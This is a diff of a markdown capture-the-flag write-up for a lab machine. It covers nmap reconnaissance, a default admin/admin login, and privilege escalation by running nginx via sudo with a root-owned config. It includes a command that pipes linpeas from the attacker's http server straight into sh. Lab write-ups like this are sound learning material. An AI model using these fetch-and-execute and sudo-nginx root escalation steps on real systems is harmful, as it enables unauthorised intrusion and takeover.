@@ -9,7 +9,13 @@ Metadata:
 
 ## Recon
 
-Started with running `nmap -sS <target-ip>` to get some information on the server. Learned that 22 & 80 were open. The fact it is using Nginx will be important later.
+Started with running `nmap -sS <target-ip>` to get some information on the server. Learned that 22 & 80 were open. I didn't know this till after, but from nmap you can get the server being used (nginx).
+
+I figured out it was Nginx by looking at the response header when inspecting the website at port 80.
+
+In hindsight, I could have ran `sudo nmap -p- -sC -sV <target-ip> --open` to get more detail about the box.
+
+_The fact it is using Nginx will be important later._
 
 When you go to `http://<target-ip>`re prompted with a basic auth pop-up. Of course, `admin/admin` would work.
 
@@ -71,11 +77,11 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 curl http://<your-ip>:8000/linpeas.sh | sh
 ```
 
-Finally, we decided to look at what others did and came across a clean privilege escalation with Nginx. This is where the rest of the credit goes to `0xdf`. Hopefully with practice, I can improve on privilege escalation. Essentially, `sudo nginx` allows you to run a webserver as root. Thereby, allowing you to expose the root.txt flag.
+Finally, I decided to look at what others did and came across a clean privilege escalation with Nginx. This is where the rest of the credit goes to `0xdf`. Hopefully with practice, I can improve on privilege escalation. Essentially, `sudo nginx` allows you to run a webserver as root. Thereby, allowing you to expose the root.txt flag.
 
 First, you need to make a nginx.conf. Using `0xdf`'s example, I was able to write the file and `curl` it to the victim's machine (using the http.server).
 
-Now, you want to save this file in a specific location that can run as root (I believe.). We stored it as `0xdf` did at `/dev/shm/nginx.conf`
+Now, you want to save this file in a specific location that can run as root (I believe.). I stored it as `0xdf` did at `/dev/shm/nginx.conf`
 
 ```
 user root;
